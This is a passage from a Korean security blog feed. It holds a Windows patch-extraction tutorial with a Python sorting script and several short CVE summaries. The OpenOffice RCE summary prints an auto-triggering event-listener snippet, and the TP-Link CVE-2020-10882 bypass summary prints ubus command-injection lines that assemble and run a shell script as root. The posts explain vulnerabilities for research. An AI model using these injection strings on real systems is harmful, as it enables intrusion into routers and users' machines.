src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3만개요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>아니 미친 ㅎㅎ</em></p><p>누적 업데이트 패키지라 지금까지의 업데이트들이 모두 포함되어 있어 이렇게 많다고 하네요…? 추출은 밥때 맞춰서 돌려놓고 밥 먹고 오면 될 것 같습니다ㅋㅋ;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> 명령어로 어떤 파일들이 추출 되었는지 트리 구조로 확인해 보도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>다양한 형식의 파일, 폴더들이 추출된 것을 볼 수 있네요.</p><ol><li><p>폴더 유형</p><p>접두어로 아키텍처가 붙음</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>파일 유형</p><ul><li>manie</li><li>cat : 보안 카탈로그</li><li>mum : 카탈로그 파일과 쌍을 이루며 메타 데이터가 포함됨</li></ul></li></ol><p>그런데.. 각 패치 폴더 안에 f랑 r 폴더가 있고, 이 안에 각각 같은 이름의 바이너리가 보이는데, 이게 뭘까요..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r 각 폴더는 Differential 폴더로, 세 가지 유형이 있습니다.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>이들은 기본 버전에서 변경될 업데이트 파일과의 차이만큼의 내용을 담고 있는 파일입니다. 이 부분은 중요한 내용이라 나중에 다시 짚어 보도록 할 테니, 꼭 기억해 두세요!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>Windows는 Windows와 WinSxS를 통해 바이너리뿐만 아니라 모든 종류의 파일을 업데이트할 수 있습니다.</p><p>WinSxS는 manifest를 참조해 패치하며 manifest에는 패치 적용 방법, 결과 파일의 권한, 설정할 레지스트리 키 등 업데이트에 대한 전반적인 리스트 정보가 있어요. 간단하게 확인해 볼까요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Component에 대한 manifest 정보를 조회한 결과입니다.</p><p>differential 폴더인 f, r가 있고, 각각에 패치될 dll과 exe 바이너리가 있는 걸 확인할 수 있어요.</p><h1 id="추출-자동화"><a href="#추출-자동화" class="headerlink" title="추출 자동화"></a>추출 자동화</h1><p>그런데 말입니다. 다 좋은데.. 추출한 파일 리스트를 좀 보려고 했더니 아키텍처 별로 분류도 없고 뒤죽박죽 개판이라 짜증 나려고 하네,,^^</p><blockquote><p>날로 먹기 좋아하는 L0ch는 바로 추출/분류 자동화 스크립트를 짜기로 합니다. 역시 원 게시글에도 스크립트가 있군요!<br>기쁜 표정으로 스크립트를 살펴본 L0ch의 표정이 어두워집니다. 무슨 일이죠? 아 ! 파워쉘로 짠 스크립트네요!<br>저런… 애석하게도 L0ch는 파워쉘을 해본 적이 없습니다. 눈물을 머금고 파이썬으로 새로 작성하는 방법밖에 없겠군요.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell 써보려고 했는데 10분만에 때려치고 걍 익숙한 파이썬 썼습니다ㅋㅋ. 익숙한 게 최고야</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>파이썬 최고다악!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msu에서 cab파일을 추출하고, 위 사진과 같이 cab에서 추출한 파일들을 각 아키텍처 폴더에 분류했습니다.<br>.manifest와 .mum, .cat 파일은 들여다볼 일이 거의 없기 때문에 JUNK로 분류를 했구요.</p><p>이렇게 분류해서 정리된 모습을 보니 편안하군요. 역시 사람은 정리를 하고 살아야 돼<br>아 그래서 제 방은 정리하고 사냐구요? 그럴 리가요..?</p><p>분량 조절 실패로.. 다음 글에서는 패치 유형을 알아보고, 본격적으로 Diffing을 해볼게요!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>안녕히 계세요 여러분! 전 이 세상의 모든 굴레와 속박을 벗어 던지고 제 행복을 찾아 떠납니다! (대충 술 먹으러 간다는 말)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor 다수</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel 정보(power consumption / electro magnetic emission)를 이용해 시스템의 operation 및 data를 유추하는 공격 방법은 세계 2차 대전 때부터 존재했습니다. 지금까지 2가지 한계가 존재했는데 다음과 같습니다.</p><ol><li>고성능의 Desktop이나 server용 CPU 보단 임베디드 마이크로 컨트롤러를 타겟으로 잡음.</li><li>오실로스코프 등을 이용한 하드웨어 기반 공격이 많았고, 소프트웨어 기반 공격의 x86 적용은 크게 성공적이지 못함. ex) RSA key 복구 시도가 2번 있었지만 실패.</li></ol><p>PLATYPUS attack은 소프트웨어 기반 side-channel 공격입니다. Intel RAPL interface에 접근해 power consumption에 대한 정보 축적 후 x86 시스템을 타겟으로 다음과 같은 행위를 할 수 있습니다.</p><ol><li>instruction 분별, control flow monitoring</li><li>AES-NI key 추출(26시간 이내)</li><li>RSA key 복구(100분 이내)</li><li>KASLR 무력화(20초 이내)</li></ol><p>Intel RARL(Running Average Power Limit)의 데이터에 누구나 접근할 수 있고 악용할 수 있습니다. 따라서 power monitoring interface들의 접근권한이 패치됐습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Android’s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core ≤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google API를 통해 사용자가 Play Store에 접근하지 않고 인앱 업데이트를 할 수 있게 해주는 Play Core Library에서 임의 코드 실행이 가능한 취약점이 발견되었습니다. 이 취약점을 악용하면 Play Core Library를 사용하는 모든 안드로이드 앱을 대상으로 임의 코드 실행을 할 수 있습니다.</p><p>취약점이 존재하는 부분은 <code>SplitCompat.install</code> 로, 동일한 기기에 설치된 타사 앱이 임의의 데이터를 broadcast 할 수 있습니다. 이 과정에서 <code>split_id</code> 에 대한 유효성 검사가 없어 path traversal를 통해 원하는 위치에 임의의 파일을 복사할 수 있습니다. 이때 임의 코드를 포함하고 파일명이  <code>config.</code> 로 시작하는 파일을  <code>verified-splits</code> 경로에 복사하면  파일이 앱의 런타임 ClassLoader에 추가되어 해당 앱에서 임의 코드가 실행됩니다. </p><p>공격자는 Play Core Library를 사용하는 앱을 타겟으로 하는 악성 APK를 제작하고, 피해자가 이를 설치하도록 유도해 피해자의 데이터를 탈취하거나 코드 실행이 가능합니다.</p><p>이 취약점은 Google Chrome을 비롯한 인기 앱에서 임의 코드 실행이 가능하다는 점에서 심각한 취약점으로 분류되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4에서 원격 코드 실행 취약점이 발견되었습니다. 해당 취약점은 LibreOffice에서 발견된 CVE-2019-9847과 유사합니다.</p><p>해당 프로그램에서 <code>script:event-listener</code> 핸들러를 매크로 실행으로 처리하지 않아서 발생한 취약점입니다.</p><p>다음과 같은 스크립트로 구성하여 OpenOffice에서 사용하는 <code>.uno 혹은 .service</code>를 통해 확인창이나 클릭 유도 없이 하이퍼 링크를 통해 URL을 열 수 있습니다.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>를 사용하여 트리거하는 것은 리눅스에서도 동작하지만 code execution으로 이어질만한 것을 찾지 못했다고 합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TV에 대한 CVE번호가 2개 발급됐습니다. TCL은 중국 전자제품 회사로 현재 TV 시장에서 3번째로 큰 비중을 차지하고 있습니다. 취약점을 제보한 Sick Codes와 John Jackson은 제조사의 의도가 의심스럽다는 말을 조심스럽게 하고 있습니다. </p><ul><li>CVE-2020-27403 : TV의 7989번 포트에 웹서버가 동작하고 있으며,  단순히 이곳에 접속하는 것 만으로 모든 file system에 접근이 가능합니다.</li><li>CVE-2020-28055 : 악성 apk 등의 local unprivileged attacker가 critical 한 시스템 리소스에 읽기 및 쓰기가 가능합니다.</li></ul><p>7989번 포트는 unassigned port입니다. 즉, 특정한 목적이 부여된 번호가 아니기 때문에 7989번 포트에 http로 file system을 내보낼 이유가 없습니다. 또한 제조사가 TV에 대한 완벽한 원격 제어가  가능합니다.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version ≤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version ≤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3에서 시스템 권한의 계정을 만들어 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>gdm3(gnome display manager)은 그래픽 인터페이스로 로그인 및 사용자 인증을 처리하는데, 새로 설치된 시스템 등의 이유로 사용자 계정을 찾을 수 없을 때 <code>gnome-initial-setup</code> 을 호출하고 sudo 그룹의 새로운 계정을 만들 수 있습니다.</p><p>gdm3에서는 기존 계정을 찾기 위해 D-Bus 메소드 호출을 사용해 <code>accountsservice</code> 데몬의 <code>look_for_existing_users_sync</code> 에서 기존 사용자 목록을 가져옵니다. 이때 서비스 거부 공격으로 <code>accountsservice</code> 데몬이 응답하지 않도록 하면 D-Bus 메소드 호출이 시간 초과로 인해 연결이 실패하고 <code>priv→have_existing_user_accounts</code> 의 기본값인 false가 유지됩니다.</p><p>이후<code>wants_initial_setup</code> 에서 <code>priv→have_existing_user_accounts</code>가 false면 gdm3는 현재 시스템에 계정이 없는 것으로 인식하고 <code>gnome-initial-setup</code>을 호출해 시스템 권한의 계정을 생성할 수 있습니다.</p><p>해당 취약점의 패치는 <code>priv-&gt;have_existing_user_accounts</code>의 기본값을 true로 수정하는 것으로 적용되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 라우터의 LAN에 있는 공격자만 악용할 수 있지만 특별한 인증이 필요하지 않은 취약점입니다.</p><p>CVE-200-10882에서 <code>system(systemCmd)</code>에 의해 Command Injection 취약점이 존재하였습니다. 해당 취약점은 <code>system()</code> 사용 대신 lua 스크립트를 이용하여 <code>lua_onemesh_call(slave_mac)</code>을 통해 명령어를 실행함으로써 패치되었습니다. <code>lua_onemesh_call()</code>은 <code>luci.controller.admin.onemesh</code> lua 스크립트를 사용하며 인수를 전달하고 요청된 함수의 핸들러를 실행하는  <code>dispatch</code>라는 이름의 특별한 함수를 사용합니다. 이때 <code>sync_wifi_specified(slave_mac)</code>이 실행됩니다. <code>sync_wifi_specified()</code>는 매개 변수를 <code>target_id</code>로 <code>printf</code>를 사용하여 구성되며 json 내용으로 실제 명령이 실행됩니다. json을 escape 하면 root로 실행되는 lua script process에서 명령 실행이 가능합니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_mac의 경우 <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>로 복사되며 <code>memset(slave_mac, 0, 0x424)</code>로 memset 됩니다. 또한 바이트 정렬로 인하여 slave_mac 변수는 0x12만큼 할당되며 17자까지 문자를 삽입할 수 있습니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>command injection</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 이상 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application은 dynamic loading을 통해 run-time 도중 어느 시점에라도 코드를 메모리에 로드할 수 있습니다. API level 29부턴 이 dynamic loading을 악용해 apk의 정적 검사를 피해 가는 악성코드들을 막기 위해 apk에 속하지 않은 코드의 load를 막고 있습니다. 하지만 여전히 DexClassLoader에 의한 .dex 파일의 dynamic loading이 가능해 여전히 악용에 사용될 수 있습니다.</p><p>모든 프로세스는 각각 <code>/proc/[PID]</code>라는 디렉터리를 갖고, 그중 <code>/proc/[PID]/maps</code>라는 파일은 프로세스의 매핑된 메모리가 기록돼있습니다.  따라서 프로세스가 어떠한 파일에 접근하면 <code>/proc/[PID]/maps</code>에 기록이 남습니다. 이 기록을 통해 프로세스가 <code>/data/data</code> 디렉터리 속 .dex 접근 여부를 검사해 dynamic loading을 탐지할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend 포너블에 적합한가?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5개월-묵힌-링크"><a href="#5개월-묵힌-링크" class="headerlink" title="5개월 묵힌 링크"></a>5개월 묵힌 링크</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>몇 달 전 Fandu형님이 직접 사용해보고 후기를 알려달라는 말과 함께 링크를 하나 던져주셨습니다. 할 일도 묵혀둬야 제맛! 5달 동안 고이 모셔놓은 GDBFrontend, 똥인지 된장인지 찍어 먹어 봅시다.</p><h1 id="설치-및-실행"><a href="#설치-및-실행" class="headerlink" title="설치 및 실행"></a>설치 및 실행</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>공식 github에 나와 있는 설치 방법입니다. 터미널 키시고 그대로 입력하시면 되겠습니다.</p><ol><li>GDB 8.2 이상</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend를 사용하기 위한 요구사항은 3가지가 있는데, 지금 저의 환경은 Ubuntu 20.04이므로 tmux만 추가로 설치해주면 환경 세팅은 끝입니다.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontend를 실행시킨 후 브라우저로 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>에  접속해주시면 됩니다. <code>-w</code> 옵션으로 working directory도 설정해 줄 수 있습니다.</p><h1 id="파이어-폭스는-나가있어"><a href="#파이어-폭스는-나가있어" class="headerlink" title="파이어 폭스는 나가있어"></a>파이어 폭스는 나가있어</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>만약 파이어폭스를 쓰고 계신다면 다른 브라우저를 사용하셔야 합니다. gdb-frontend server와의 연결이 계속 끊기길래 원인을 찾느라 시간 낭비를 좀 많이 했습니다. 자주 애용하는 gdb 플러그인 pwndbg와의 충돌이 문제라 생각해 pwndbg도 지워보고, 아예 VM을 새로 생성해 처음부터 다시 환경 구축해봤지만 결국 파폭과의 호환 문제였네요…</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem · Issue #5 · rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-훑어보기"><a href="#gui-훑어보기" class="headerlink" title="gui 훑어보기"></a>gui 